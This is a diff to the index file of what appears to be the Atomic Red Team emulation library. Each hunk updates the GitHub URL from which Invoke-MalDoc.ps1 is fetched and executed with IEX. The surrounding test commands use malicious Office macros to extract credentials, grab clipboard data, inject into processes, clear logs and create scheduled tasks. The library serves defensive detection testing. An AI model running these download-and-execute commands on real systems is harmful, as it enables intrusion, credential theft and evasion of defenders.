@@ -1114,7 +1114,7 @@ credential-access:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
         cleanup_command: 'Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction
           Ignore
@@ -6933,7 +6933,7 @@ collection:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt"
           -ErrorAction Ignore
@@ -15237,7 +15237,7 @@ privilege-escalation:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
@@ -15372,7 +15372,7 @@ privilege-escalation:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
     - name: Remote Process Injection in LSASS via mimikatz
@@ -16268,7 +16268,7 @@ privilege-escalation:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -20455,7 +20455,7 @@ defense-evasion:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
         name: powershell
         elevation_required: true
@@ -25299,7 +25299,7 @@ defense-evasion:
           $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
           $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
         cleanup_command: 'Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
 
@@ -30944,7 +30944,7 @@ defense-evasion:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
@@ -31079,7 +31079,7 @@ defense-evasion:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
     - name: Remote Process Injection in LSASS via mimikatz
@@ -44428,7 +44428,7 @@ persistence:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -58730,7 +58730,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
@@ -58792,7 +58792,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -58831,7 +58831,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -58869,7 +58869,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
         name: powershell
@@ -59004,7 +59004,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
     - name: Potentially Unwanted Applications (PUA)
@@ -60224,7 +60224,7 @@ execution:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -61138,7 +61138,7 @@ execution:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
         cleanup_command: 'Get-WmiObject win32_process | Where-Object {$_.CommandLine
           -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
@@ -61176,7 +61176,7 @@ execution:
 '
       executor:
         command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
-          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\"
           -officeProduct \"Word\" -sub \"Extract\"\n"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin"
@@ -68378,7 +68378,7 @@ initial-access:
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
